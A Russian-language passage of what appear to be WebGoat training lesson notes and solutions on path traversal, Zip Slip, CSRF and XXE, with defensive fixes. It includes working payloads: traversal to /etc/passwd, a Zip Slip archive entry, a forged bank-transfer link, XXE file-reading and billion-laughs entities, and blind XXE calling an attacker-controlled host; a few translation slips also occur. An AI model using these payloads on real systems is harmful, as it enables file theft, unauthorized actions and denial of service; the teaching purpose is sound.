[https://nvisium.com/blog/2015/05/21/dont-break-your-backbone-xss-mitigation.html](https://nvisium.com/blog/2015/05/21/dont-break-your-backbone-xss-mitigation.html)

**Angular**
Angular по умолчанию пытается экранировать данные, но было доказано, что язык выражений имеет способы обхода «песочницы». Лучше всего проверять детали используемой вами версии и начинать консультироваться здесь: https://docs.angularjs.org/guide/security

---

#### **Обход пути (Path traversal)**

##### **Обход пути (Path Traversal)**

Обход пути (каталога) — это уязвимость, при которой злоумышленник может получить доступ к файлам и каталогам за пределами расположения приложения или записывать в них. Это может привести к чтению файлов из других каталогов и перезаписи критически важных системных файлов в случае загрузки файлов.

**Как это работает?

Например, предположим, у нас есть приложение, которое размещает некоторые файлы в следующем формате: `http://example.com/filterreport.pdf`. Теперь, будучи злоумышленником, вы, конечно, заинтересованы в других файлах, поэтому вы пытаетесь запросить `https://example.com/filter../../../../../etc/passwd`. В этом случае вы пытаетесь подняться до корневой файловой системы, а затем перейти в `/etc/passwd`, чтобы получить доступ к этому файлу. Последовательность `../` называется «точка-точка-слеш», что дало другое название этой атаке.

Конечно, это простой пример, и в большинстве случаев это не сработает, так как в фреймворках implemented средства контроля. Поэтому нам нужно проявить немного больше изобретательности и начать кодировать `../` перед отправкой запроса на сервер. Например, если мы закодируем `../` с помощью URL-encoding, мы получим `%2e%2e%2f`, и веб-сервер, принимающий этот запрос, декодирует его обратно в `../`.

Также обратите внимание, что для обхода фильтрации таких кодировок приложениями может сработать и двойное кодирование. Двойное кодирование может быть необходимо, когда у вас есть система A, которая вызывает систему B. Система A декодирует URL только один раз и вызывает B с все еще закодированным URL.

---

##### **Уязвимость Zip Slip**

Как разработчик, вы часто сталкиваетесь с необходимостью работы с zip-файлами. Например, рассмотрим функцию загрузки или обработки набора CSV-файлов, загружаемых в виде zip-архива. Команда безопасности Snyk обнаружила и ответственно раскрыла аккуратную уязвимость. Она представляет собой обход пути, который можно использовать при распаковке файлов. С помощью обхода пути пытаются перезаписать файлы за пределами целевой папки. Например, вы можете получить возможность перезаписать команду `ls` при извлечении zip-файла. Как только эта команда будет заменена с добавлением некоторых вредоносных действий, каждый раз, когда пользователь вводит `ls`, вы можете отправить результат листинга на свой сервер, прежде чем показать фактическую команду пользователю. В итоге вы получаете удаленное выполнение команд.

**Проблема**

Проблема возникает из-за того, как мы извлекаем zip-файлы в Java; распространенный способ сделать это:

```java
File destinationDir = new File("/tmp/zip");
Enumeration<? extends ZipEntry> entries = zip.entries();
while (entries.hasMoreElements()) {
    ZipEntry e = entries.nextElement();
    File f = new File(destinationDir, e.getName());
    InputStream is = zip.getInputStream(e);
    Files.copy(is, f.toPath(), StandardCopyOption.REPLACE_EXISTING);
}
```

На первый взгляд, это выглядит нормально, и вы, возможно, писали что-то подобное. Как мы видели в предыдущих заданиях, проблема заключается в том, что можно использовать обход пути, чтобы выйти за пределы `destinationDir` и начать перемещаться к другим расположениям.

Но что, если мы получим zip-файл со следующим содержимым:

```
orders.csv
../../../../../../../tmp/evil.sh
```

Если вы извлечете zip-файл с помощью приведенного выше кода, файл будет сохранен в `/tmp/evil.sh`.

---

##### **Решение**

Сначала давайте создадим zip-файл с изображением внутри:

```bash
curl -o webwolf.jpg http://127.0.0.1:9999/WebWolf/images/wolf.png
zip profile.zip webwolf.jpg
```

Теперь давайте загрузим это как наше изображение профиля. Мы видим, что ничего не происходит, как упоминалось в задании, в программном обеспечении есть ошибка, и результат, который мы видим на экране, таков:

```
Zip file extracted successfully. Failed to copy the image. Please get in touch with our helpdesk.
```

Давайте создадим zip-файл, который осуществляет переход наверх, а затем возвращается в указанный в задании каталог.

Сначала создайте структуру каталогов:

```bash
mkdir -p /home/webgoat/.webgoat-2025.3/PathTraversal/llssvs
cd /home/webgoat/.webgoat-2025.3/PathTraversal/llssvs
curl -o llssvs.jpg http://127.0.0.1:9999/WebWolf/images/wolf.png
zip profile.zip ../../../../home/webgoat/.webgoat-2025.3/PathTraversal/llssvs/llssvs.jpg
```

Теперь, если мы загрузим этот zip-файл, задание будет решено.

##### **Почему это сработало?**

В коде разработчики использовали следующий фрагмент:

```java
1    ZipFile zip = new ZipFile(uploadedZipFile);
2    Enumeration<? extends ZipEntry> entries = zip.entries();
3    while (entries.hasMoreElements()) {
4        ZipEntry e = entries.nextElement();
5        File profilePicture = new File(uploadDirectory, e.getName());
6        InputStream is = zip.getInputStream(e);
7        Files.copy(is, profilePicture.toPath(), StandardCopyOption.REPLACE_EXISTING);
8    }
```

Исправление заключается в том, чтобы убедиться, что результирующий файл в строке 5 находится в том каталоге, который вы ожидаете. Так же, как и при защите от обхода пути, используйте `profilePicture.getCanonicalPath()`, чтобы убедиться, что путь соответствует ожидаемому.

---

### **(A5) Небезопасные настройки безопасности (Security Misconfiguration)** 

#### **Подделка межсайтовых запросов (CSRF)**

##### **Что такое подделка межсайтовых запросов (CSRF)?**

Подделка межсайтовых запросов, также известная как одно-кликовая атака или езда на сессии, и обозначаемая как CSRF (иногда произносится как «си-сёрф») или XSRF, — это тип вредоносного использования веб-сайта, при котором несанкционированные команды передаются от пользователя, которому доверяет веб-сайт. В отличие от межсайтового скриптинга (XSS), который использует доверие пользователя к определенному сайту, CSRF использует доверие, которое сайт оказывает браузеру пользователя.

Подделка межсайтовых запросов — это атака типа «сбитый с толку заместитель» против веб-браузера. CSRF обычно имеет следующие характеристики:

*   Она затрагивает сайты, которые полагаются на личность пользователя.
*   Она использует доверие сайта к этой личности.
*   Она обманывает браузер пользователя, заставляя его отправлять HTTP-запросы на целевой сайт.
*   Она включает HTTP-запросы, которые имеют побочные эффекты.

В группе риска находятся веб-приложения, которые выполняют действия на основе ввода от доверенных и аутентифицированных пользователей, не требуя от пользователя авторизации конкретного действия. Пользователь, аутентифицированный с помощью cookie, сохраненного в его веб-браузере, может неумышленно отправить HTTP-запрос на сайт, который доверяет пользователю, и тем самым вызвать нежелательное действие.

Атака CSRF нацелена на/злоупотребляет базовой функциональностью веба. Если сайт позволяет выполнить действие, которое вызывает изменение состояния на сервере, такое как изменение адреса электронной почты или пароля жертвы, или покупка чего-либо, это является мишенью. Принуждение жертвы к получению данных не приносит пользы злоумышленнику, потому что злоумышленник не получает ответ — его получает жертва. Как таковые, CSRF-атаки нацелены на запросы, изменяющие состояние.

Давайте продолжим некоторыми упражнениями, чтобы рассмотреть способы выполнения CSRF-запроса.

---

##### **CSRF с GET-запросом**

Это самая простая CSRF-атака для выполнения. Например, вы получаете электронное письмо со следующим содержанием:
`<a href="http://bank.com/transfer?account_number_from=123456789&account_number_to=987654321&amount=100000">Посмотрите мои фотографии!</a>`

Если пользователь все еще вошел на сайт bank.com, этот простой GET-запрос переведет деньги с одного счета на другой. Конечно, в большинстве случаев на сайте, вероятно, есть несколько средств контроля для подтверждения запроса.

---

##### **Автоматическая поддержка со стороны фреймворков**

Большинство современных фреймворков имеют встроенную поддержку для предотвращения CSRF. Например, в Angular перехватчик по умолчанию читает токен из cookie с именем `XSRF-TOKEN` и устанавливает его в качестве HTTP-заголовка `X-XSRF-TOKEN`. Поскольку только код, работающий на вашем домене, может читать эту cookie, бэкенд может быть уверен, что HTTP-запрос поступил от вашего клиентского приложения, а не от злоумышленника.

Чтобы это работало, сервер бэкенда устанавливает токен в cookie. Поскольку значение cookie должно быть прочитано Angular (JavaScript), эта cookie НЕ должна быть помечена флагом `HttpOnly`. При каждом запросе к серверу Angular будет помещать токен в заголовок HTTP `X-XSRF-TOKEN`. Сервер может проверить, совпадают ли эти два токена, и это гарантирует серверу, что запрос выполняется на том же домене.

==**Важно: ОПРЕДЕЛИТЕ ОТДЕЛЬНУЮ COOKIE, НЕ ПЕРЕИСПОЛЬЗУЙТЕ COOKIE СЕАНСА**==

Помните, cookie сеанса всегда должна быть определена с флагом `HttpOnly`.

**Пользовательские заголовки небезопасны**

Другой защитой может быть добавление пользовательского заголовка запроса к каждому вызову. Это будет работать, если все взаимодействия с сервером выполняются с помощью JavaScript. На стороне сервера вам нужно только проверить наличие этого заголовка; если этот заголовк отсутствует — отклонить запрос. Некоторые фреймворки предлагают эту реализацию по умолчанию, однако исследователь Алекс Инерио обнаружил, что это также можно обойти. Вы можете прочитать об этом здесь: Adobe Reader PDF - Client Side Request Injection.

---

##### **Но у меня только JSON API и CORS отключен, как они могут быть уязвимы для CSRF?**

Многие веб-приложения не реализуют никакой защиты от CSRF, полагаясь на то, что они работают только с `application/json` в качестве типа контента. Единственный способ сделать запрос с этим типом контента из браузера — это XHR-запрос. Прежде чем браузер сможет сделать такой запрос, к серверу будет отправлен предварительный запрос (помните, что CSRF-запрос будет межсайтовым). Если ответ на предварительный запрос не разрешает межсайтовый запрос, браузер не выполнит вызов.

Если дать короткий ответ: это не является действительной защитой от CSRF.

Один пример, почему этой защиты недостаточно, можно найти [здесь](ссылка не указана в исходном тексте). Оказывается, `Navigator.sendBeacon()` позволял отправлять POST-запросы с произвольным типом контента.

>Метод `navigator.sendBeacon()` используется для асинхронной передачи небольшого объема данных по HTTP на веб-сервер. Этот метод отвечает потребностям аналитического и диагностического кода, который обычно пытается отправить данные на веб-сервер до выгрузки документа. Более ранняя отправка данных может привести к упущенной возможности собрать данные...

Например:

```javascript
function postBeacon() {
    var data = new Blob(JSON.stringify({"author": "WebGoat"}));
    navigator.sendBeacon("http://localhost:8083", data);
}
```

Я думаю, что ограничения на тип контента полезны для сайтов, которые случайно защищены от CSRF. Они не предназначены для этого, но они защищены, потому что они, так уж случилось, принимают только XML или JSON полезные нагрузки.

Тем не менее, несколько очевидно, что сайты, зависящие от этого поведения, должны быть исправлены, и любые уважаемые составители рекомендаций укажут на это. Вопрос в том, должна ли быть ответственность браузера действовать как нянька для слабых сайтов, или мы должны оставить слабые сайты как источник серьезных проблем. Выживание сильнейших.

IMHO, ответ где-то посередине, и хорошим первым шагом было бы документировать все эти подводные камни политики одинакового происхождения (Same Origin Policy), от которых могут зависеть сайты в плане безопасности.

>Но что касается этой конкретной ошибки, если бы она никогда не была исправлена, я не думаю, что это был бы конец света. Но, опять же, в наш день и возраст, возможно, есть способ запустить ядерные ракеты через XML RPC интерфейс, так что, возможно, это действительно был бы конец света.                                       — Эдуардо Вела


И Firefox, и Chrome исправили эту проблему, но это показывает, почему вы должны реализовать защиту от CSRF, вместо того чтобы полагаться на content-type ваших API.

---

##### **Влияние CSRF**

Воздействие ограничено только тем, что может делать вошедший в систему пользователь (если сайт/функция/действие не защищены должным образом). Области, которые действительно подвержены CSRF-атакам, — это устройства IoT и «умные» приборы. К сожалению, многие потребительские маршрутизаторы также оказались уязвимыми для CSRF.

**Решения для CSRF

**Атрибут SameSite для cookie**

Это новое расширение, которое поддерживают современные браузеры; оно ограничивает область действия cookie таким образом, что она будет прикрепляться к запросам только в том случае, если эти запросы являются «междоменными» (same-site). Например, запросы к `http://webgoat.org/something` будут прикреплять same-site cookie, если запрос инициирован с webgoat.org. Существует два режима: `Strict` и `Lax`. Первый не разрешает межсайтовые запросы, это означает, что когда вы находитесь на `github.com` и хотите поставить «лайк» через Facebook (и Facebook указывает same-site как `Strict`), вы будете перенаправлены на страницу входа, потому что браузер не прикрепляет cookie для Facebook. Больше информации можно найти здесь: [Preventing CSRF with SameSite Cookie Attribute](https://www.sjoerdlangkemper.nl/2016/04/14/preventing-csrf-with-samesite-cookie-attribute/)

**Другие защиты

К счастью, многие фреймворки (веб-)приложений теперь поставляются со встроенной поддержкой для обработки CSRF-атак. Например, Spring и Tomcat имеют это включенным по умолчанию. До тех пор, пока вы не отключите это (как это сделано в WebGoat), вы должны быть в безопасности от CSRF-атак.

**Смотрите следующую информацию о защите от CSRF:

*   [https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) (Предотвращение/Защита)
*   [https://owasp.org/www-community/attacks/csrf](https://owasp.org/www-community/attacks/csrf) (Атака)
*   [https://tomcat.apache.org/tomcat-7.0-doc/config/filter.html#CSRF_Prevention_Filter](https://tomcat.apache.org/tomcat-7.0-doc/config/filter.html#CSRF_Prevention_Filter) / [https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CSRF_Prevention_Filter](https://tomcat.apache.org/tomcat-8.0-doc/config/filter.html#CSRF_Prevention_Filter) (Tomcat)
*   [https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf](https://docs.spring.io/spring-security/site/docs/current/reference/html5/#csrf) (Spring Security)

---

#### **XML External Entity (XXE)**

##### **Концепция

Этот урок обучает тому, как выполнить атаку XML External Entity (XXE), как ею можно злоупотребить и как защититься от неё.

**Цели

- Пользователь должен иметь базовые знания о XML.
- Пользователь поймёт, как работают XML-парсеры.
- Пользователь научится выполнять XXE-атаку и как от неё защищаться.

---

##### **Что такое XML-сущность?

XML-сущность позволяет определять теги, которые будут заменены содержимым при разборе XML-документа. В целом существует три типа сущностей:

*   Внутренние сущности
*   Внешние сущности
*   Параметрические сущности.

Сущность должна быть создана в определении типа документа (DTD). Начнем с примера:

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE blog [
    <!ELEMENT author (#PCDATA)>
    <!ENTITY js "Jo Smith">
]>
<blog>
    <author>&js;</author>
</blog>
```

Как видите, после обработки XML-документа парсером он заменит определенную сущность `&js;` на определенную константу `Jo Smith`. Как вы можете заметить, это имеет много преимуществ, так как вы можете изменить `js` в одном месте, например, на `John Smith`.

В Java-приложении XML может использоваться для получения данных от клиента к серверу. Мы все знакомы с JSON API, но мы также можем использовать XML для передачи информации. Чаще всего фреймворк автоматически заполняет Java-объект на основе структуры XML, например:

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE blog [
    <!ELEMENT author (#PCDATA)>
    <!ENTITY js "Jo Smith">
]>
<blog>
    <author>&js;</author>
</blog>
```

```java
class Blog {
    private String author;
}
```

---

**Что такое инъекция XXE?

Атака типа XML External Entity (XXE) — это вид атаки на приложение, которое обрабатывает XML-ввод. Эта атака происходит, когда XML-ввод, содержащий ссылку на внешнюю сущность, обрабатывается слабо настроенным XML-парсером. Эта атака может привести к раскрытию конфиденциальных данных, отказу в обслуживании, подделке запросов на стороне сервера (SSRF), сканированию портов с точки зрения машины, на которой расположен парсер, и другим воздействиям на систему.

Атаки могут включать раскрытие локальных файлов, которые могут содержать конфиденциальные данные, такие как пароли или личные данные пользователей, с использованием схем `file:` или относительных путей в системном идентификаторе. Поскольку атака происходит относительно приложения, обрабатывающего XML-документ, злоумышленник может использовать это доверенное приложение для доступа к другим внутренним системам, возможно, раскрывая другое внутреннее содержимое через HTTP-запросы или запуская CSRF-атаку на любые незащищенные внутренние службы. В некоторых ситуациях библиотека обработки XML, уязвимая к проблемам повреждения памяти на стороне клиента, может быть использована путем разыменования вредоносного URI, что, возможно, позволит выполнить произвольный код под учетной записью приложения. Другие атаки могут получать доступ к локальным ресурсам, которые могут не прекращать возвращать данные, что, возможно, повлияет на доступность приложения, если слишком много потоков или процессов не будет освобождено.

В целом мы можем выделить следующие виды XXE-атак:

*   **Классическая**: в этом случае внешняя сущность включается в локальный DTD.
*   **Слепая**: в ответе не отображаются никакие выходные данные и/или ошибки.
*   **Через ошибку**: попытка получить содержимое ресурса в сообщении об ошибке.

---

##### **Пример XXE

Давайте рассмотрим пример инъекции XXE. В предыдущем разделе мы видели, что XML-сущности можно использовать следующим образом:

```xml
<?xml version="1.0" standalone="yes" ?>
<!DOCTYPE author [
    <!ELEMENT author (#PCDATA)>
    <!ENTITY js "Jo Smith">
]>
<author>&js;</author>
```

**Объявление внешнего DTD

Определение этих сущностей также делает возможным определение другого DTD во внешнем файле, например:

```xml
<?xml version="1.0"?>
<!DOCTYPE note SYSTEM "email.dtd">
<email>
    <to>webgoat@webgoat.org</to>
    <from>webwolf@webwolf.org</from>
    <subject>Your app is great, but contains flaws</subject>
    <body>Hi, your application contains some SQL injections</body>
</email>
```

И файл `email.dtd` может быть определен следующим образом:

```xml
<!ELEMENT email (to, from, title, body)>
<!ELEMENT to (#PCDATA)>
<!ELEMENT from (#PCDATA)>
<!ELEMENT subject (#PCDATA)>
<!ELEMENT body (#PCDATA)>
```

**XXE

Если XML-парсер настроен так, чтобы разрешать внешние DTD или сущности, мы можем заменить приведенный выше фрагмент XML на следующий:

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE author [
    <!ENTITY js SYSTEM "file:///etc/passwd">
]>
<author>&js;</author>
```

Что теперь произойдет? Мы определили включение из локальной файловой системы. XML-парсер загрузит файл и добавит его содержимое туда, где на сущность ссылаются. Предположим, что XML-сообщение возвращается пользователю; тогда сообщение будет содержать содержимое файла `/etc/passwd`.

---

##### **Решение задания

Цель упражнения — отобразить список корневой файловой системы. Если мы сначала попробуем обычный POST-запрос, мы увидим следующее:

```
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?><comment><text>This is my first comment, nice picture</text></comment>
```

Веб-страница делает XHR-запрос для отправки XML-сообщения, после чего комментарий отображается в разделе комментариев. Теперь давайте попробуем немного изменить запрос, как показано в предыдущем разделе:

```
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
```

Итак, вместо включения конкретного файла мы ссылаемся на корень файловой системы с помощью `file:///`. Если мы просто скопируем и вставим это в текстовое поле комментария, мы получим ошибку в теле ответа:

```json
{
    "lessonComplete" : false,
    "feedback": "Sorry the solution is not correct, please try again.",
    "output": "... javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,44]\\nMessage: The processing instruction target matching '\\'[xX][mM][lL]\\'' is not allowed.",
    "assignment": "SimpleXXE",
    "attemptWasMade": true
}
```

Это происходит из-за того, что JavaScript берет ввод и создает следующее сообщение:

```
POST /WebGoat/xxe/simple
Content-Type: application/xml

<?xml version="1.0"?>
<comment>
<text>
<?xml version="1.0"?><!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;</text></comment>
</text>
</comment>
```

Строка 7 содержит ввод, введенный в текстовое поле, если бы мы использовали форму комментария.

Чтобы решить урок, вам необходимо перехватить полный исходящий запрос и заменить все его тело решением. Смотрите наши уроки о перехвате HTTP-трафика.

---

##### **Поиск XXE при анализе кода

Теперь, когда мы знаем, как работает инъекция, давайте посмотрим, почему это может произойти. В Java-приложениях конфигурация библиотек XML по умолчанию небезопасна, и вам нужно изменить настройки. Предположим, вы нашли следующий фрагмент кода во время анализа кода:

```java
public XmlMapper xmlMapper() {
    return new XmlMapper(XMLInputFactory.newInstance());
}
```

Одновременно с этим, просматривая заметки о выпуске библиотеки Jackson, вы читаете:

> `[xz#17]`: Отключить `SUPPORT_DTD` для `XMLInputFactory`, если явно не переопределено.
> — Jackson 2.7.8 (26-Sep-2016)

**Вопрос:** уязвим ли парсер?

Этот фрагмент кода определяет новый `XmlMapper` (`ObjectMapper`), который является популярным фреймворком для чтения и записи XML и JSON. Если мы углубимся в код на один уровень, мы найдем:

```java
/*
 * @since 2.4
 */
public XmlMapper(XMLInputFactory inputF) { // (1)
    this(new XmlFactory(inputF)); // (2)
}
```

1.  Это «конструктор», который мы вызвали в листинге выше (!)
2.  Вызов другого «конструктора» и инициализация нового экземпляра `XmlFactory`

Давайте посмотрим на исходный код `XmlFactory`:

```java
public XmlFactory(XMLInputFactory xmlIn) { // (3)
    this(xmlIn, null);
}

protected XmlFactory(XMLInputFactory xmlIn, XMLOutputFactory xmlOut, ...) { // (4)
    if (xmlIn == null) { // (5)
        xmlIn = XMLInputFactory.newInstance();
        // as per [dataformat-xml#19], disable external entity expansion by default
        xmlIn.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, Boolean.FALSE); // (6)
        // and ditto wrt [dataformat-xml#22]; SUPPORT_DTD
        xmlIn.setProperty(XMLInputFactory.SUPPORT_DTD, Boolean.FALSE); // (7)
    }
    // ... остальной код ...
}
```

3.  Это определение «конструктора» нового экземпляра, созданного в (3).
4.  Вызов другого «конструктора», определенного в (3).
5.  Мы знаем, что условие `if (xmlIn == null)` не будет истинным, потому что, если мы посмотрим на наше объявление вверху, мы создали наш собственный экземпляр `XMLInputFactory.newInstance()`, который не является `null`. Это означает, что у нас есть XML-парсер, который по умолчанию не защищен от инъекции XXE. Интересная часть в (6) и (7) — это дополнительная защита, вложенная внутри оператора `if`.

Если мы посмотрим, например, на фреймворк Spring Boot, как они инициализируют тот же парсер:

```java
public ObjectMapper create() {
    return new XmlMapper(xmlInputFactory()); // (1)
}

private static XMLInputFactory xmlInputFactory() { // (2)
    XMLInputFactory inputFactory = XMLInputFactory.newInstance();
    inputFactory.setProperty(XMLInputFactory.SUPPORT_DTD, false); // (3)
    inputFactory.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false); // (4)
    return inputFactory;
}
```

1.  Вызов метода, который безопасно инициализирует парсер.
2.  Метод, который явно определяет `XMLInputFactory`.
3.  и 4. Устанавливает те же свойства для парсера, которые мы видели в предыдущем листинге.

Как вы можете видеть, не так просто выяснить, защищен ли парсер от инъекции; вам действительно нужно копаться в коде и библиотеке, чтобы понять, каковы настройки парсера.

Ознакомьтесь с [шпаргалкой по предотвращению XXE](https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html) для получения дополнительных способов защиты вашего парсера.

---

##### **Решение задания

Идея этого задания заключается в том, что хотя может показаться, что приложение принимает только JSON, если мы изменим тело сообщения на XML, фреймворк может его обработать. Когда вы пытаетесь ввести комментарий, тело запроса будет таким:

```json
{"text":"My first comment"}
```

Это обычное JSON-сообщение. Давайте попробуем изменить Content-Type запроса:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

{"text":"My first comment"}
```

Это приводит к следующему исключению:

```
javax.xml.bind.UnmarshalException
 -- with linked exception:
[javax.xml.stream.XMLStreamException: ParseError at [row,col]:[1,1]
Message: Content is not allowed in prolog.
```

В зависимости от XML-парсера вы можете получить более понятное сообщение об ошибке. В данном случае сообщение немного загадочное: оно означает, что мы отправляем недопустимый XML. Например, библиотека Jackson выдает следующее сообщение:

```
JSON parse error: Unexpected character '(' (code 40) in prolog: expected '<'
 at [row,col {unknown-source}]: [1,1]
```

Эта ошибка возникает, потому что мы все еще отправляем JSON-сообщение на конечную точку. Поэтому, если мы перехватим запрос и изменим JSON-сообщение на XML:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<text>This is my first message</text>
```

Снова получаем сообщение об ошибке от конечной точки:

```
javax.xml.bind.UnmarshalException
 -- with linked exception:
[com.sun.istack.SAXParseException2; lineNumber: 1; columnNumber: 7; unexpected element (uri:"", local:"text"). Expected elements are <!{comment}]
```

Парсер указывает, что сообщение не является допустимым XML и должно быть заключено в тег `comment`:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<comment><text>This is my first message</text></comment>
```

Конечная точка больше не выдает ошибок, и если вы обновите страницу в WebGoat, отправленные комментарии появятся. Чтобы атака сработала, нам нужно отправить:

```
POST http://localhost:8080/WebGoat/xxe/content-type HTTP/1.1
Content-Type: application/xml

<!DOCTYPE user [<!ENTITY root SYSTEM "file:///"> ]><comment><text>&root;This is my first message</text></comment>
```

В некоторых корпоративных сетях сетевые устройства могут полностью отбрасывать этот полезный нагрузок, если он отправляется по HTTP. В этом случае на POST-запрос не возвращается ответ, и конечная точка никогда не получает запрос. Однако такая защита имеет ограниченную полезность, поскольку тот же запрос успешно пройдет при использовании HTTPS, где этот полезный нагрузок будет зашифрован.

---

##### **Атака типа "Отказ в обслуживании" (DOS) через XXE

С помощью той же XXE-атаки мы можем выполнить атаку типа "отказ в обслуживании" (DOS) на сервер. Пример такой атаки:

```xml
<?xml version="1.0"?>
<!DOCTYPE lolz [
 <!ENTITY lol "lol">
 <!ELEMENT lolz (#PCDATA)>
 <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
 <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
 <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
 <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
 <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
 <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
 <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
 <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
 <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
]>
<lolz>&lol9;</lolz>
```

Когда XML-парсер загружает этот документ, он видит, что он включает один корневой элемент "lolz", который содержит текст "&lol9;". Однако "&lol9;" является определенной сущностью, которая раскрывается в строку, содержащую десять строк "&lol8;". Каждая строка "&lol8;" является определенной сущностью, которая раскрывается в десять строк "&lol7;", и так далее. После обработки всех раскрытий сущностей этот небольшой блок XML (менее 1 КБ) фактически займет почти 3 гигабайта памяти.

Это называется атакой "**Мilliard смеха**" (Billion laughs). Более подробная информация доступна здесь: https://en.wikipedia.org/wiki/Billion_laughs

**Принцип работы:**
- Создается цепочка вложенных сущностей, где каждая последующая ссылается на предыдущую
- Экспоненциальный рост объема данных при раскрытии сущностей
- Небольшой XML-документ может потребовать гигабайты памяти для обработки
- Приводит к исчерпанию ресурсов сервера (памяти, процессора)

---

##### **Слепая XXE

В некоторых случаях вы не увидите никакого вывода, потому что, хотя ваша атака могла сработать, поле не отражается в выводе страницы. Или ресурс, который вы пытаетесь прочитать, содержит недопустимые XML-символы, что приводит к сбою парсера. Начнем с примера: в этом случае мы ссылаемся на внешний DTD, которым мы управляем на нашем собственном сервере.

Как злоумышленник, вы контролируете WebWolf (это может быть любой сервер под вашим контролем). Вы можете, например, использовать этот сервер, чтобы пинговать его, используя `http://127.0.0.1:9999/WebWolf/home`.

Как мы можем использовать эту конечную точку, чтобы проверить, можем ли мы выполнить XXE?

Мы снова можем использовать WebWolf для размещения файла с именем `attack.dtd`. Создайте этот файл со следующим содержимым:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!ENTITY ping SYSTEM "http://127.0.0.1:9999/WebWolf/landing?test=HelloWorld">
```

Теперь отправьте форму, изменив XML на:

```xml
<?xml version="1.0"?>
<!DOCTYPE root [
    <!ENTITY % remote SYSTEM "http://localhost:9090/WebWolf/attack.dtd">
    %remote;
]>
<comment>
    <text>test&ping;</text>
</comment>
```

Теперь в WebWolf перейдите в «incoming requests», и вы увидите:

```json
{
  "method" : "GET",
  "path" : "/landing",
  "headers" : {
    "request" : {
      "user-agent" : "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0"
    }
  },
  "parameters" : {
    "test" : ["HelloWorld"]
  },
  "timeTaken" : "1"
}
```

Итак, с помощью XXE мы смогли пинговать наш собственный сервер, что означает, что инъекция XXE возможна. Таким образом, с помощью инъекции XXE мы基本上 можем достичь того же эффекта, что и в начале с помощью команды curl.

---

##### **Защита от XXE

Чтобы защититься от XXE-атак, вам необходимо убедиться, что вы проверяете ввод, полученный от ненадежного клиента. В мире Java вы также можете указать своему парсеру полностью игнорировать DTD, например:

```java
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.SUPPORT_DTD, false);
```

Если вы не можете полностью отключить поддержку DTD, вы также можете указать XML-парсеру игнорировать внешние сущности, например:

```java
XMLInputFactory xif = XMLInputFactory.newFactory();
xif.setProperty(XMLInputFactory.IS_SUPPORTING_EXTERNAL_ENTITIES, false);
xif.setProperty(XMLInputFactory.SUPPORT_DTD, true);
```

Для получения дополнительной информации о конфигурации см. шпаргалку по предотвращению XXE.

**Проверка

Реализуйте правильную проверку для заголовков `Content-Type` и `Accept`. Не полагайтесь solely на фреймворк в обработке входящего запроса. Если клиент указывает неправильный заголовок Accept, возвращайте статус `406 Not Acceptable`.

---

##### **Поиск проблем XXE с помощью статического анализа кода

Статический анализ кода может помочь выявить уязвимости в коде. Известным инструментом статического анализа является SonarQube. Когда вы запускаете сканирование кода исходного кода WebGoat, вы получите что-то вроде:

*   OWASP Top 10
    *   A1 - Injection
    *   A2 - Sensitive Data Exposure
    *   A3 - Broken Authentication
    *   A4 - Broken Access Control
    *   A5 - Security Misconfiguration
    *   **A6 - XML External Entities (XXE)**
    *   ...

Если вы выберете категорию XXE, это покажет вам расположение уязвимости XXE.

```java
protected Comment parseXml(String xml) throws JAXBException, XMLStreamException {
    var jc = JAXBContext.newInstance(Comment.class);
    var xif = XMLInputFactory.newInstance();
```

Следующий шаг — определить, является ли это реальной проблемой или ложным срабатыванием. Как вы уже знаете из задания-челленджа, это реальная проблема. В данном случае она добавлена намеренно.

SonarQube также показывает, что можно сделать, чтобы это исправить.

**XML-парсеры не должны быть уязвимы к XXE-атакам**

Библиотека `XMLInputFactory`:

```java
XMLInputFactory factory = XMLInputFactory.newInstance();
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_DTD, ""); // Соответствует стандарту
factory.setProperty(XMLConstants.ACCESS_EXTERNAL_SCHEMA, ""); // Соответствует стандарту
```

